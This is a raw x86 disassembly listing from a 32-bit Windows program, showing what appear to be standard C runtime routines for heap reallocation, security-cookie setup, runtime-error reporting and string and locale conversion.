  427265:	mov    ebx,DWORD PTR [ebp+0xc]
  427268:	or     eax,eax
  42726a:	je     0x42729f
  42726c:	js     0x4272aa
  42726e:	mov    edi,DWORD PTR [ebx+0x8]
  427271:	push   ebx
  427272:	call   0x4281a0
  427277:	add    esp,0x4
  42727a:	lea    ebp,[ebx+0x10]
  42727d:	push   esi
  42727e:	push   ebx
  42727f:	call   0x4281e2
  427284:	add    esp,0x8
  427287:	lea    ecx,[esi+esi*2]
  42728a:	push   0x1
  42728c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427290:	call   0x428276
  427295:	mov    eax,DWORD PTR [edi+ecx*4]
  427298:	mov    DWORD PTR [ebx+0xc],eax
  42729b:	call   DWORD PTR [edi+ecx*4+0x8]
  42729f:	mov    edi,DWORD PTR [ebx+0x8]
  4272a2:	lea    ecx,[esi+esi*2]
  4272a5:	mov    esi,DWORD PTR [edi+ecx*4]
  4272a8:	jmp    0x42724b
  4272aa:	mov    eax,0x0
  4272af:	jmp    0x4272cd
  4272b1:	mov    eax,0x1
  4272b6:	jmp    0x4272cd
  4272b8:	push   ebp
  4272b9:	lea    ebp,[ebx+0x10]
  4272bc:	push   0xffffffff
  4272be:	push   ebx
  4272bf:	call   0x4281e2
  4272c4:	add    esp,0x8
  4272c7:	pop    ebp
  4272c8:	mov    eax,0x1
  4272cd:	pop    ebp
  4272ce:	pop    edi
  4272cf:	pop    esi
  4272d0:	pop    ebx
  4272d1:	mov    esp,ebp
  4272d3:	pop    ebp
  4272d4:	ret    
  4272d5:	push   ebp
  4272d6:	mov    ecx,DWORD PTR [esp+0x8]
  4272da:	mov    ebp,DWORD PTR [ecx]
  4272dc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272df:	push   eax
  4272e0:	mov    eax,DWORD PTR [ecx+0x18]
  4272e3:	push   eax
  4272e4:	call   0x4281e2
  4272e9:	add    esp,0x8
  4272ec:	pop    ebp
  4272ed:	ret    0x4
  4272f0:	call   0x425203
  4272f5:	add    eax,0x8
  4272f8:	ret    
  4272f9:	push   0x14
  4272fb:	push   0x429880
  427300:	call   0x425350
  427305:	mov    edi,DWORD PTR [ebp+0x8]
  427308:	xor    ebx,ebx
  42730a:	cmp    edi,ebx
  42730c:	jne    0x42731c
  42730e:	push   DWORD PTR [ebp+0xc]
  427311:	call   0x426072
  427316:	pop    ecx
  427317:	jmp    0x4274a0
  42731c:	mov    esi,DWORD PTR [ebp+0xc]
  42731f:	cmp    esi,ebx
  427321:	jne    0x42732f
  427323:	push   edi
  427324:	call   0x425f5a
  427329:	pop    ecx
  42732a:	jmp    0x42749e
  42732f:	cmp    DWORD PTR ds:0x45e144,0x3
  427336:	jne    0x42746a
  42733c:	mov    DWORD PTR [ebp-0x1c],ebx
  42733f:	cmp    esi,0xffffffe0
  427342:	ja     0x427439
  427348:	push   0x4
  42734a:	call   0x42550f
  42734f:	pop    ecx
  427350:	mov    DWORD PTR [ebp-0x4],ebx
  427353:	push   edi
  427354:	call   0x426732
  427359:	pop    ecx
  42735a:	mov    DWORD PTR [ebp-0x20],eax
  42735d:	cmp    eax,ebx
  42735f:	je     0x427409
  427365:	cmp    esi,DWORD PTR ds:0x45df04
  42736b:	ja     0x4273b9
  42736d:	push   esi
  42736e:	push   edi
  42736f:	push   eax
  427370:	call   0x426c32
  427375:	add    esp,0xc
  427378:	test   eax,eax
  42737a:	je     0x427381
  42737c:	mov    DWORD PTR [ebp-0x1c],edi
  42737f:	jmp    0x4273b9
  427381:	push   esi
  427382:	call   0x426f11
  427387:	pop    ecx
  427388:	mov    DWORD PTR [ebp-0x1c],eax
  42738b:	cmp    eax,ebx
  42738d:	je     0x4273b9
  42738f:	mov    eax,DWORD PTR [edi-0x4]
  427392:	dec    eax
  427393:	mov    DWORD PTR [ebp-0x24],eax
  427396:	cmp    eax,esi
  427398:	jb     0x42739c
  42739a:	mov    eax,esi
  42739c:	push   eax
  42739d:	push   edi
  42739e:	push   DWORD PTR [ebp-0x1c]
  4273a1:	call   0x426090
  4273a6:	push   edi
  4273a7:	call   0x426732
  4273ac:	mov    DWORD PTR [ebp-0x20],eax
  4273af:	push   edi
  4273b0:	push   eax
  4273b1:	call   0x42675d
  4273b6:	add    esp,0x18
  4273b9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273bc:	jne    0x427409
  4273be:	cmp    esi,ebx
  4273c0:	jne    0x4273c8
  4273c2:	xor    esi,esi
  4273c4:	inc    esi
  4273c5:	mov    DWORD PTR [ebp+0xc],esi
  4273c8:	add    esi,0xf
  4273cb:	and    esi,0xfffffff0
  4273ce:	mov    DWORD PTR [ebp+0xc],esi
  4273d1:	push   esi
  4273d2:	push   ebx
  4273d3:	push   DWORD PTR ds:0x45e140
  4273d9:	call   DWORD PTR ds:0x429030
  4273df:	mov    DWORD PTR [ebp-0x1c],eax
  4273e2:	cmp    eax,ebx
  4273e4:	je     0x427409
  4273e6:	mov    eax,DWORD PTR [edi-0x4]
  4273e9:	dec    eax
  4273ea:	mov    DWORD PTR [ebp-0x24],eax
  4273ed:	cmp    eax,esi
  4273ef:	jb     0x4273f3
  4273f1:	mov    eax,esi
  4273f3:	push   eax
  4273f4:	push   edi
  4273f5:	push   DWORD PTR [ebp-0x1c]
  4273f8:	call   0x426090
  4273fd:	push   edi
  4273fe:	push   DWORD PTR [ebp-0x20]
  427401:	call   0x42675d
  427406:	add    esp,0x14
  427409:	or     DWORD PTR [ebp-0x4],0xffffffff
  42740d:	call   0x427461
  427412:	cmp    DWORD PTR [ebp-0x20],ebx
  427415:	jne    0x427439
  427417:	cmp    esi,ebx
  427419:	jne    0x42741e
  42741b:	xor    esi,esi
  42741d:	inc    esi
  42741e:	add    esi,0xf
  427421:	and    esi,0xfffffff0
  427424:	mov    DWORD PTR [ebp+0xc],esi
  427427:	push   esi
  427428:	push   edi
  427429:	push   ebx
  42742a:	push   DWORD PTR ds:0x45e140
  427430:	call   DWORD PTR ds:0x4290d4
  427436:	mov    DWORD PTR [ebp-0x1c],eax
  427439:	mov    eax,DWORD PTR [ebp-0x1c]
  42743c:	cmp    eax,ebx
  42743e:	jne    0x4274a0
  427440:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427446:	je     0x4274a0
  427448:	push   esi
  427449:	call   0x427c32
  42744e:	pop    ecx
  42744f:	test   eax,eax
  427451:	jne    0x42733c
  427457:	jmp    0x42749e
  427459:	xor    ebx,ebx
  42745b:	mov    esi,DWORD PTR [ebp+0xc]
  42745e:	mov    edi,DWORD PTR [ebp+0x8]
  427461:	push   0x4
  427463:	call   0x42547b
  427468:	pop    ecx
  427469:	ret    
  42746a:	xor    eax,eax
  42746c:	cmp    esi,0xffffffe0
  42746f:	ja     0x427487
  427471:	cmp    esi,ebx
  427473:	jne    0x427478
  427475:	xor    esi,esi
  427477:	inc    esi
  427478:	push   esi
  427479:	push   edi
  42747a:	push   ebx
  42747b:	push   DWORD PTR ds:0x45e140
  427481:	call   DWORD PTR ds:0x4290d4
  427487:	cmp    eax,ebx
  427489:	jne    0x4274a0
  42748b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427491:	je     0x4274a0
  427493:	push   esi
  427494:	call   0x427c32
  427499:	pop    ecx
  42749a:	test   eax,eax
  42749c:	jne    0x42746a
  42749e:	xor    eax,eax
  4274a0:	call   0x42538b
  4274a5:	ret    
  4274a6:	push   0x10
  4274a8:	push   0x429890
  4274ad:	call   0x425350
  4274b2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274b9:	jne    0x4274f5
  4274bb:	push   0x4
  4274bd:	call   0x42550f
  4274c2:	pop    ecx
  4274c3:	and    DWORD PTR [ebp-0x4],0x0
  4274c7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ca:	push   esi
  4274cb:	call   0x426732
  4274d0:	pop    ecx
  4274d1:	mov    DWORD PTR [ebp-0x1c],eax
  4274d4:	test   eax,eax
  4274d6:	je     0x4274e3
  4274d8:	mov    esi,DWORD PTR [esi-0x4]
  4274db:	sub    esi,0x9
  4274de:	mov    DWORD PTR [ebp-0x20],esi
  4274e1:	jmp    0x4274e6
  4274e3:	mov    esi,DWORD PTR [ebp-0x20]
  4274e6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274ea:	call   0x427513
  4274ef:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274f3:	jne    0x427508
  4274f5:	push   DWORD PTR [ebp+0x8]
  4274f8:	push   0x0
  4274fa:	push   DWORD PTR ds:0x45e140
  427500:	call   DWORD PTR ds:0x4290d8
  427506:	mov    esi,eax
  427508:	mov    eax,esi
  42750a:	call   0x42538b
  42750f:	ret    
  427510:	mov    esi,DWORD PTR [ebp-0x20]
  427513:	push   0x4
  427515:	call   0x42547b
  42751a:	pop    ecx
  42751b:	ret    
  42751c:	push   ebp
  42751d:	mov    ebp,esp
  42751f:	sub    esp,0x10
  427522:	push   esi
  427523:	lea    eax,[ebp-0x8]
  427526:	push   eax
  427527:	call   DWORD PTR ds:0x4290e8
  42752d:	mov    esi,DWORD PTR [ebp-0x4]
  427530:	xor    esi,DWORD PTR [ebp-0x8]
  427533:	call   DWORD PTR ds:0x4290e4
  427539:	xor    esi,eax
  42753b:	call   DWORD PTR ds:0x42909c
  427541:	xor    esi,eax
  427543:	call   DWORD PTR ds:0x4290e0
  427549:	xor    esi,eax
  42754b:	lea    eax,[ebp-0x10]
  42754e:	push   eax
  42754f:	call   DWORD PTR ds:0x4290dc
  427555:	mov    eax,DWORD PTR [ebp-0xc]
  427558:	xor    eax,DWORD PTR [ebp-0x10]
  42755b:	xor    esi,eax
  42755d:	mov    DWORD PTR ds:0x45d430,esi
  427563:	jne    0x42756f
  427565:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42756f:	pop    esi
  427570:	leave  
  427571:	ret    
  427572:	push   0x118
  427577:	push   0x429a40
  42757c:	call   0x425350
  427581:	mov    eax,ds:0x45d430
  427586:	xor    eax,DWORD PTR [ebp+0x4]
  427589:	mov    DWORD PTR [ebp-0x1c],eax
  42758c:	mov    eax,ds:0x45dd98
  427591:	xor    ecx,ecx
  427593:	cmp    eax,ecx
  427595:	je     0x4275b6
  427597:	mov    DWORD PTR [ebp-0x4],ecx
  42759a:	push   DWORD PTR [ebp+0xc]
  42759d:	push   DWORD PTR [ebp+0x8]
  4275a0:	call   eax
  4275a2:	pop    ecx
  4275a3:	pop    ecx
  4275a4:	or     DWORD PTR [ebp-0x4],0xffffffff
  4275a8:	jmp    0x4276b4
  4275ad:	xor    eax,eax
  4275af:	inc    eax
  4275b0:	ret    
  4275b1:	mov    esp,DWORD PTR [ebp-0x18]
  4275b4:	jmp    0x4275a4
  4275b6:	mov    eax,DWORD PTR [ebp+0x8]
  4275b9:	dec    eax
  4275ba:	je     0x4275cf
  4275bc:	mov    edi,0x429a1c
  4275c1:	mov    DWORD PTR [ebp-0x20],0x429968
  4275c8:	mov    esi,0xd4
  4275cd:	jmp    0x4275e0
  4275cf:	mov    edi,0x429948
  4275d4:	mov    DWORD PTR [ebp-0x20],0x4298a8
  4275db:	mov    esi,0xb9
  4275e0:	mov    BYTE PTR [ebp-0x24],cl
  4275e3:	push   0x104
  4275e8:	lea    eax,[ebp-0x128]
  4275ee:	push   eax
  4275ef:	push   ecx
  4275f0:	call   DWORD PTR ds:0x42906c
  4275f6:	test   eax,eax
  4275f8:	jne    0x42760d
  4275fa:	push   0x42959c
  4275ff:	lea    eax,[ebp-0x128]
  427605:	push   eax
  427606:	call   0x425730
  42760b:	pop    ecx
  42760c:	pop    ecx
  42760d:	lea    ebx,[ebp-0x128]
  427613:	lea    eax,[ebp-0x128]
  427619:	push   eax
  42761a:	call   0x425960
  42761f:	pop    ecx
  427620:	add    eax,0xb
  427623:	cmp    eax,0x3c
  427626:	jbe    0x427651
  427628:	lea    eax,[ebp-0x128]
  42762e:	push   eax
  42762f:	call   0x425960
  427634:	mov    ebx,eax
  427636:	lea    eax,[ebp-0x128]
  42763c:	sub    eax,0x31
  42763f:	add    ebx,eax
  427641:	push   0x3
  427643:	push   0x429598
  427648:	push   ebx
  427649:	call   0x425830
  42764e:	add    esp,0x10
  427651:	push   ebx
  427652:	call   0x425960
  427657:	pop    ecx
  427658:	lea    eax,[eax+esi*1+0xc]
  42765c:	add    eax,0x3
  42765f:	and    eax,0xfffffffc
  427662:	call   0x4253a0
  427667:	mov    DWORD PTR [ebp-0x18],esp
  42766a:	mov    esi,esp
  42766c:	push   edi
  42766d:	push   esi
  42766e:	call   0x425730
  427673:	mov    edi,0x429578
  427678:	push   edi
  427679:	push   esi
  42767a:	call   0x425740
  42767f:	push   0x42989c
  427684:	push   esi
  427685:	call   0x425740
  42768a:	push   ebx
  42768b:	push   esi
  42768c:	call   0x425740
  427691:	push   edi
  427692:	push   esi
  427693:	call   0x425740
  427698:	push   DWORD PTR [ebp-0x20]
  42769b:	push   esi
  42769c:	call   0x425740
  4276a1:	push   0x12010
  4276a6:	push   0x429550
  4276ab:	push   esi
  4276ac:	call   0x425632
  4276b1:	add    esp,0x3c
  4276b4:	push   0x3
  4276b6:	call   0x4247bc
  4276bb:	int3   
  4276bc:	push   0x38
  4276be:	push   0x429e60
  4276c3:	call   0x425350
  4276c8:	xor    ebx,ebx
  4276ca:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276d0:	jne    0x42770a
  4276d2:	push   ebx
  4276d3:	push   ebx
  4276d4:	xor    esi,esi
  4276d6:	inc    esi
  4276d7:	push   esi
  4276d8:	push   0x429e5c
  4276dd:	push   0x100
  4276e2:	push   ebx
  4276e3:	call   DWORD PTR ds:0x4290f4
  4276e9:	test   eax,eax
  4276eb:	je     0x4276f5
  4276ed:	mov    DWORD PTR ds:0x45ddbc,esi
  4276f3:	jmp    0x42770a
  4276f5:	call   DWORD PTR ds:0x429028
  4276fb:	cmp    eax,0x78
  4276fe:	jne    0x42770a
  427700:	mov    DWORD PTR ds:0x45ddbc,0x2
  42770a:	cmp    DWORD PTR [ebp+0x14],ebx
  42770d:	jle    0x42772a
  42770f:	mov    ecx,DWORD PTR [ebp+0x14]
  427712:	mov    eax,DWORD PTR [ebp+0x10]
  427715:	dec    ecx
  427716:	cmp    BYTE PTR [eax],bl
  427718:	je     0x427722
  42771a:	inc    eax
  42771b:	cmp    ecx,ebx
  42771d:	jne    0x427715
  42771f:	or     ecx,0xffffffff
  427722:	or     eax,0xffffffff
  427725:	sub    eax,ecx
  427727:	add    DWORD PTR [ebp+0x14],eax
  42772a:	mov    eax,ds:0x45ddbc
  42772f:	cmp    eax,0x2
  427732:	je     0x427914
  427738:	cmp    eax,ebx
  42773a:	je     0x427914
  427740:	cmp    eax,0x1
  427743:	jne    0x427947
  427749:	xor    edi,edi
  42774b:	mov    DWORD PTR [ebp-0x1c],edi
  42774e:	mov    DWORD PTR [ebp-0x20],ebx
  427751:	mov    DWORD PTR [ebp-0x24],ebx
  427754:	cmp    DWORD PTR [ebp+0x20],ebx
  427757:	jne    0x427761
  427759:	mov    eax,ds:0x45ddb4
  42775e:	mov    DWORD PTR [ebp+0x20],eax
  427761:	push   ebx
  427762:	push   ebx
  427763:	push   DWORD PTR [ebp+0x14]
  427766:	push   DWORD PTR [ebp+0x10]
  427769:	xor    eax,eax
  42776b:	cmp    DWORD PTR [ebp+0x24],ebx
  42776e:	setne  al
  427771:	lea    eax,[eax*8+0x1]
  427778:	push   eax
  427779:	push   DWORD PTR [ebp+0x20]
  42777c:	call   DWORD PTR ds:0x4290f0
  427782:	mov    esi,eax
  427784:	mov    DWORD PTR [ebp-0x28],esi
  427787:	cmp    esi,ebx
  427789:	je     0x427947
  42778f:	mov    DWORD PTR [ebp-0x4],0x1
  427796:	lea    eax,[esi+esi*1]
  427799:	add    eax,0x3
  42779c:	and    eax,0xfffffffc
  42779f:	call   0x4253a0
  4277a4:	mov    DWORD PTR [ebp-0x18],esp
  4277a7:	mov    eax,esp
  4277a9:	mov    DWORD PTR [ebp-0x2c],eax
  4277ac:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b0:	jmp    0x4277cd
  4277b2:	xor    eax,eax
  4277b4:	inc    eax
  4277b5:	ret    
  4277b6:	mov    esp,DWORD PTR [ebp-0x18]
  4277b9:	call   0x4287e5
  4277be:	xor    ebx,ebx
  4277c0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277c3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277c7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ca:	mov    esi,DWORD PTR [ebp-0x28]
  4277cd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277d0:	jne    0x4277ee
  4277d2:	lea    eax,[esi+esi*1]
  4277d5:	push   eax
  4277d6:	call   0x426072
  4277db:	pop    ecx
  4277dc:	mov    DWORD PTR [ebp-0x2c],eax
  4277df:	cmp    eax,ebx
  4277e1:	je     0x427947
  4277e7:	mov    DWORD PTR [ebp-0x20],0x1
  4277ee:	push   esi
  4277ef:	push   DWORD PTR [ebp-0x2c]
  4277f2:	push   DWORD PTR [ebp+0x14]
  4277f5:	push   DWORD PTR [ebp+0x10]
  4277f8:	push   0x1
  4277fa:	push   DWORD PTR [ebp+0x20]
  4277fd:	call   DWORD PTR ds:0x4290f0
  427803:	test   eax,eax
  427805:	je     0x4278f1
  42780b:	push   ebx
  42780c:	push   ebx
  42780d:	push   esi
  42780e:	push   DWORD PTR [ebp-0x2c]
  427811:	push   DWORD PTR [ebp+0xc]
  427814:	push   DWORD PTR [ebp+0x8]
  427817:	call   DWORD PTR ds:0x4290f4
  42781d:	mov    edi,eax
  42781f:	mov    DWORD PTR [ebp-0x1c],edi
  427822:	cmp    edi,ebx
  427824:	je     0x4278f1
  42782a:	test   BYTE PTR [ebp+0xd],0x4
  42782e:	je     0x42785d
  427830:	cmp    DWORD PTR [ebp+0x1c],ebx
  427833:	je     0x4278f1
  427839:	cmp    edi,DWORD PTR [ebp+0x1c]
  42783c:	jg     0x4278f1
  427842:	push   DWORD PTR [ebp+0x1c]
  427845:	push   DWORD PTR [ebp+0x18]
  427848:	push   esi
  427849:	push   DWORD PTR [ebp-0x2c]
  42784c:	push   DWORD PTR [ebp+0xc]
  42784f:	push   DWORD PTR [ebp+0x8]
  427852:	call   DWORD PTR ds:0x4290f4
  427858:	jmp    0x4278f1
  42785d:	mov    DWORD PTR [ebp-0x4],0x2
  427864:	lea    eax,[edi+edi*1]
  427867:	add    eax,0x3
  42786a:	and    eax,0xfffffffc
  42786d:	call   0x4253a0
  427872:	mov    DWORD PTR [ebp-0x18],esp
  427875:	mov    eax,esp
  427877:	mov    DWORD PTR [ebp-0x30],eax
  42787a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42787e:	jmp    0x42789b
  427880:	xor    eax,eax
  427882:	inc    eax
  427883:	ret    
  427884:	mov    esp,DWORD PTR [ebp-0x18]
  427887:	call   0x4287e5
  42788c:	xor    ebx,ebx
  42788e:	mov    DWORD PTR [ebp-0x30],ebx
  427891:	or     DWORD PTR [ebp-0x4],0xffffffff
  427895:	mov    edi,DWORD PTR [ebp-0x1c]
  427898:	mov    esi,DWORD PTR [ebp-0x28]
  42789b:	cmp    DWORD PTR [ebp-0x30],ebx
  42789e:	jne    0x4278b8
  4278a0:	lea    eax,[edi+edi*1]
  4278a3:	push   eax
  4278a4:	call   0x426072
  4278a9:	pop    ecx
  4278aa:	mov    DWORD PTR [ebp-0x30],eax
  4278ad:	cmp    eax,ebx
  4278af:	je     0x4278f1
  4278b1:	mov    DWORD PTR [ebp-0x24],0x1
  4278b8:	push   edi
  4278b9:	push   DWORD PTR [ebp-0x30]
  4278bc:	push   esi
  4278bd:	push   DWORD PTR [ebp-0x2c]
  4278c0:	push   DWORD PTR [ebp+0xc]
  4278c3:	push   DWORD PTR [ebp+0x8]
  4278c6:	call   DWORD PTR ds:0x4290f4
  4278cc:	test   eax,eax
  4278ce:	je     0x4278f1
  4278d0:	push   ebx
  4278d1:	push   ebx
  4278d2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278d5:	jne    0x4278db
  4278d7:	push   ebx
  4278d8:	push   ebx
  4278d9:	jmp    0x4278e1
  4278db:	push   DWORD PTR [ebp+0x1c]
  4278de:	push   DWORD PTR [ebp+0x18]
  4278e1:	push   edi
  4278e2:	push   DWORD PTR [ebp-0x30]
  4278e5:	push   ebx
  4278e6:	push   DWORD PTR [ebp+0x20]
  4278e9:	call   DWORD PTR ds:0x429080
  4278ef:	mov    edi,eax
  4278f1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278f4:	je     0x4278ff
  4278f6:	push   DWORD PTR [ebp-0x30]
  4278f9:	call   0x425f5a
  4278fe:	pop    ecx
  4278ff:	cmp    DWORD PTR [ebp-0x20],ebx
  427902:	je     0x42790d
  427904:	push   DWORD PTR [ebp-0x2c]
  427907:	call   0x425f5a
  42790c:	pop    ecx
  42790d:	mov    eax,edi
  42790f:	jmp    0x427a6f
  427914:	mov    DWORD PTR [ebp-0x34],ebx
  427917:	xor    edi,edi
  427919:	mov    DWORD PTR [ebp-0x38],ebx
  42791c:	cmp    DWORD PTR [ebp+0x8],ebx
  42791f:	jne    0x427929
  427921:	mov    eax,ds:0x45dda4
  427926:	mov    DWORD PTR [ebp+0x8],eax
  427929:	cmp    DWORD PTR [ebp+0x20],ebx
  42792c:	jne    0x427936
  42792e:	mov    eax,ds:0x45ddb4
  427933:	mov    DWORD PTR [ebp+0x20],eax
  427936:	push   DWORD PTR [ebp+0x8]
  427939:	call   0x4285cd
  42793e:	pop    ecx
  42793f:	mov    DWORD PTR [ebp-0x3c],eax
  427942:	cmp    eax,0xffffffff
  427945:	jne    0x42794e
  427947:	xor    eax,eax
  427949:	jmp    0x427a6f
  42794e:	cmp    eax,DWORD PTR [ebp+0x20]
  427951:	je     0x427a45
  427957:	push   ebx
  427958:	push   ebx
  427959:	lea    ecx,[ebp+0x14]
  42795c:	push   ecx
  42795d:	push   DWORD PTR [ebp+0x10]
  427960:	push   eax
  427961:	push   DWORD PTR [ebp+0x20]
  427964:	call   0x428616
  427969:	add    esp,0x18
  42796c:	mov    DWORD PTR [ebp-0x34],eax
  42796f:	cmp    eax,ebx
  427971:	je     0x427947
  427973:	push   ebx
  427974:	push   ebx
  427975:	push   DWORD PTR [ebp+0x14]
  427978:	push   eax
  427979:	push   DWORD PTR [ebp+0xc]
  42797c:	push   DWORD PTR [ebp+0x8]
  42797f:	call   DWORD PTR ds:0x4290ec
  427985:	mov    esi,eax
  427987:	mov    DWORD PTR [ebp-0x40],esi
  42798a:	cmp    esi,ebx
  42798c:	je     0x427a34
  427992:	mov    DWORD PTR [ebp-0x4],ebx
  427995:	add    eax,0x3
  427998:	and    eax,0xfffffffc
  42799b:	call   0x4253a0
  4279a0:	mov    DWORD PTR [ebp-0x18],esp
  4279a3:	mov    edi,esp
  4279a5:	mov    DWORD PTR [ebp-0x44],edi
  4279a8:	push   esi
  4279a9:	push   ebx
  4279aa:	push   edi
  4279ab:	call   0x427c50
  4279b0:	add    esp,0xc
  4279b3:	jmp    0x4279c5
  4279b5:	xor    eax,eax
  4279b7:	inc    eax
  4279b8:	ret    
  4279b9:	mov    esp,DWORD PTR [ebp-0x18]
  4279bc:	call   0x4287e5
  4279c1:	xor    ebx,ebx
  4279c3:	xor    edi,edi
  4279c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279c9:	cmp    edi,ebx
  4279cb:	jne    0x4279f0
  4279cd:	push   DWORD PTR [ebp-0x40]
  4279d0:	call   0x426072
  4279d5:	pop    ecx
  4279d6:	mov    edi,eax
  4279d8:	cmp    edi,ebx
  4279da:	je     0x427a0d
  4279dc:	push   DWORD PTR [ebp-0x40]
  4279df:	push   ebx
  4279e0:	push   edi
  4279e1:	call   0x427c50
  4279e6:	add    esp,0xc
  4279e9:	mov    DWORD PTR [ebp-0x38],0x1
  4279f0:	push   DWORD PTR [ebp-0x40]
  4279f3:	push   edi
  4279f4:	push   DWORD PTR [ebp+0x14]
  4279f7:	push   DWORD PTR [ebp-0x34]
  4279fa:	push   DWORD PTR [ebp+0xc]
  4279fd:	push   DWORD PTR [ebp+0x8]
  427a00:	call   DWORD PTR ds:0x4290ec
  427a06:	mov    DWORD PTR [ebp-0x40],eax
  427a09:	cmp    eax,ebx
  427a0b:	jne    0x427a11
  427a0d:	xor    esi,esi
  427a0f:	jmp    0x427a37
  427a11:	push   DWORD PTR [ebp+0x1c]
  427a14:	push   DWORD PTR [ebp+0x18]
  427a17:	lea    eax,[ebp-0x40]
  427a1a:	push   eax
  427a1b:	push   edi
  427a1c:	push   DWORD PTR [ebp+0x20]
  427a1f:	push   DWORD PTR [ebp-0x3c]
  427a22:	call   0x428616
  427a27:	add    esp,0x18
  427a2a:	mov    esi,eax
  427a2c:	neg    esi
  427a2e:	sbb    esi,esi
  427a30:	neg    esi
  427a32:	jmp    0x427a37
  427a34:	mov    esi,DWORD PTR [ebp-0x48]
  427a37:	cmp    DWORD PTR [ebp-0x38],ebx
  427a3a:	je     0x427a5f
  427a3c:	push   edi
  427a3d:	call   0x425f5a
  427a42:	pop    ecx
  427a43:	jmp    0x427a5f
  427a45:	push   DWORD PTR [ebp+0x1c]
  427a48:	push   DWORD PTR [ebp+0x18]
  427a4b:	push   DWORD PTR [ebp+0x14]
  427a4e:	push   DWORD PTR [ebp+0x10]
  427a51:	push   DWORD PTR [ebp+0xc]
  427a54:	push   DWORD PTR [ebp+0x8]
  427a57:	call   DWORD PTR ds:0x4290ec
  427a5d:	mov    esi,eax
  427a5f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a62:	je     0x427a6d
  427a64:	push   DWORD PTR [ebp-0x34]
  427a67:	call   0x425f5a
  427a6c:	pop    ecx
  427a6d:	mov    eax,esi
  427a6f:	lea    esp,[ebp-0x54]
  427a72:	call   0x42538b
  427a77:	ret    
  427a78:	push   0x1c
  427a7a:	push   0x429e88
  427a7f:	call   0x425350
  427a84:	xor    esi,esi
  427a86:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a8c:	jne    0x427ac3
  427a8e:	lea    eax,[ebp-0x1c]
  427a91:	push   eax
  427a92:	xor    edi,edi
  427a94:	inc    edi
  427a95:	push   edi
  427a96:	push   0x429e5c
  427a9b:	push   edi
  427a9c:	call   DWORD PTR ds:0x4290fc
  427aa2:	test   eax,eax
  427aa4:	je     0x427aae
  427aa6:	mov    DWORD PTR ds:0x45ddc0,edi
  427aac:	jmp    0x427ac3
  427aae:	call   DWORD PTR ds:0x429028
  427ab4:	cmp    eax,0x78
  427ab7:	jne    0x427ac3
  427ab9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ac3:	mov    eax,ds:0x45ddc0
  427ac8:	cmp    eax,0x2
  427acb:	je     0x427bbb
  427ad1:	cmp    eax,esi
  427ad3:	je     0x427bbb
  427ad9:	cmp    eax,0x1
  427adc:	jne    0x427be1
  427ae2:	mov    DWORD PTR [ebp-0x20],esi
  427ae5:	mov    DWORD PTR [ebp-0x24],esi
  427ae8:	cmp    DWORD PTR [ebp+0x18],esi
  427aeb:	jne    0x427af5
  427aed:	mov    eax,ds:0x45ddb4
  427af2:	mov    DWORD PTR [ebp+0x18],eax
  427af5:	push   esi
  427af6:	push   esi
  427af7:	push   DWORD PTR [ebp+0x10]
  427afa:	push   DWORD PTR [ebp+0xc]
  427afd:	xor    eax,eax
  427aff:	cmp    DWORD PTR [ebp+0x20],esi
  427b02:	setne  al
  427b05:	lea    eax,[eax*8+0x1]
  427b0c:	push   eax
  427b0d:	push   DWORD PTR [ebp+0x18]
  427b10:	call   DWORD PTR ds:0x4290f0
  427b16:	mov    edi,eax
  427b18:	mov    DWORD PTR [ebp-0x28],edi
  427b1b:	test   edi,edi
  427b1d:	je     0x427be1
  427b23:	and    DWORD PTR [ebp-0x4],0x0
  427b27:	lea    ebx,[edi+edi*1]
  427b2a:	mov    eax,ebx
  427b2c:	add    eax,0x3
  427b2f:	and    eax,0xfffffffc
  427b32:	call   0x4253a0
  427b37:	mov    DWORD PTR [ebp-0x18],esp
  427b3a:	mov    esi,esp
  427b3c:	mov    DWORD PTR [ebp-0x2c],esi
  427b3f:	push   ebx
  427b40:	push   0x0
  427b42:	push   esi
  427b43:	call   0x427c50
  427b48:	add    esp,0xc
  427b4b:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b4f:	jmp    0x427b66
  427b51:	xor    eax,eax
  427b53:	inc    eax
  427b54:	ret    
  427b55:	mov    esp,DWORD PTR [ebp-0x18]
  427b58:	call   0x4287e5
  427b5d:	xor    esi,esi
  427b5f:	or     DWORD PTR [ebp-0x4],0xffffffff
  427b63:	mov    edi,DWORD PTR [ebp-0x28]
  427b66:	test   esi,esi
  427b68:	jne    0x427b81
  427b6a:	push   edi
  427b6b:	push   0x2
  427b6d:	call   0x426468
  427b72:	pop    ecx
  427b73:	pop    ecx
  427b74:	mov    esi,eax
  427b76:	test   esi,esi
  427b78:	je     0x427be1
  427b7a:	mov    DWORD PTR [ebp-0x24],0x1
  427b81:	push   edi
  427b82:	push   esi
  427b83:	push   DWORD PTR [ebp+0x10]
  427b86:	push   DWORD PTR [ebp+0xc]
  427b89:	push   0x1
  427b8b:	push   DWORD PTR [ebp+0x18]
  427b8e:	call   DWORD PTR ds:0x4290f0
  427b94:	test   eax,eax
  427b96:	je     0x427ba9
  427b98:	push   DWORD PTR [ebp+0x14]
  427b9b:	push   eax
  427b9c:	push   esi
  427b9d:	push   DWORD PTR [ebp+0x8]
  427ba0:	call   DWORD PTR ds:0x4290fc
  427ba6:	mov    DWORD PTR [ebp-0x20],eax
  427ba9:	cmp    DWORD PTR [ebp-0x24],0x0
  427bad:	je     0x427bb6
  427baf:	push   esi
  427bb0:	call   0x425f5a
